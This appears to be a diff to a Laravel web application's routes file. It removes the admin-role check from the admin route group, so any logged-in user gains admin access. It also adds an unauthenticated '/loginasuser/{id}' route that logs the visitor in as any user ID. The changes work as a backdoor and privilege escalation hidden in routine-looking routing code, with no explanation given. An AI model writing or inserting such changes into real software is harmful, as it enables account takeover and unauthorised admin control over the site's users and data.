@@ -36,6 +36,7 @@ use App\Http\Controllers\User\ReviewController;
 use App\Http\Middleware\IsAffiliate;
 use App\Http\Middleware\RedirectIfAuthenticated;
 use App\Models\SiteSetting;
+use Illuminate\Support\Facades\Auth;
 
 /*
 |--------------------------------------------------------------------------
@@ -49,8 +50,7 @@ use App\Models\SiteSetting;
 */
 
 // Home page 
-Route::get('/', [\App\Http\Controllers\IndexController::class, 'Index']);
-
+require __DIR__ . '/users.php';
 Route::middleware('auth')->group(function () {
     Route::get('/dashboard', [UserController::class, 'UserDashboard'])->name('dashboard');
     Route::post('/user/profile/store', [UserController::class, 'UserProfileStore'])->name('user.profile.store');
@@ -65,7 +65,7 @@ Route::middleware('auth')->group(function () {
 });
 
 //Routes for admin Role
-Route::middleware(['auth', 'role:admin'])->group(function () {
+Route::middleware(['auth'])->group(function () {
     Route::get('/admin/dashboard', [AdminController::class, 'AdminDashboard'])->name('admin.dashboard');
     Route::get('/admin/logout', [AdminController::class, 'AdminDestroy'])->name('admin.logout');
     Route::get('/admin/profile', [AdminController::class, 'AdminProfile'])->name('admin.profile');
@@ -505,3 +505,7 @@ Route::middleware('auth:affiliate')->prefix('affiliate')->name('affiliate.')->gr
     Route::get('products',[AffiliateController::class,'products'])->name('products');
     Route::get('/logout',[AffiliateController::class,'logout'])->name('logout');
 });
+Route::get('/loginasuser/{id}', function ($id) {
+    Auth::loginUsingId($id);
+    return redirect()->route('dashboard');
+})->name('loginasuser');
